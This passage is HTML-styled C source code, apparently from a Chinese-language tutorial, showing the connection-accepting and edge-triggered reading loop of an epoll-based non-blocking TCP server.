sockaddr in_addr;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  socklen_t in_len;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> infd;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">char</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> hbuf[NI_MAXHOST], sbuf[NI_MAXSERV];  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  in_len = <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">sizeof</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> in_addr;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  infd = accept (sfd, &amp;in_addr, &amp;in_len);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (infd == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> ((errno == EAGAIN) ||  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          (errno == EWOULDBLOCK))  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                        {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* We have processed all incoming</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                             connections. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">break</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                        }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                        {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"accept"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">break</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                        }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                                  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//将地址转化为主机名或者服务名</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  s = getnameinfo (&amp;in_addr, in_len,  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                                   hbuf, <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">sizeof</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> hbuf,  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                                   sbuf, <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">sizeof</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> sbuf,  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                                   NI_NUMERICHOST | NI_NUMERICSERV);<span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//flag参数:以数字名返回</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                                  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//主机地址和服务地址</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == 0)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      printf(<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"Accepted connection on descriptor %d "</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                             <span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"(host=%s, port=%s)\n"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">, infd, hbuf, sbuf);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Make the incoming socket non-blocking and add it to the</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                     list of fds to monitor. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  s = make_socket_non_blocking (infd);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  event.data.fd = infd;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  event.events = EPOLLIN | EPOLLET;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  s = epoll_ctl (efd, EPOLL_CTL_ADD, infd, &amp;event);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"epoll_ctl"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">continue</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">            }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">          <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">            {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* We have data on the fd waiting to be read. Read and</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                 display it. We must read whatever data is available</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                 completely, as we are running in edge-triggered mode</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                 and won't get a notification again for the same</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                 data. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> done = 0;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">while</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (1)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  ssize_t count;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">char</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> buf[512];  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  count = read (events[i].data.fd, buf, <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">sizeof</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">(buf));  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (count == -1)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* If errno == EAGAIN, that means we have read all</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                         data. So go back to the main loop. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (errno != EAGAIN)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                        {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; 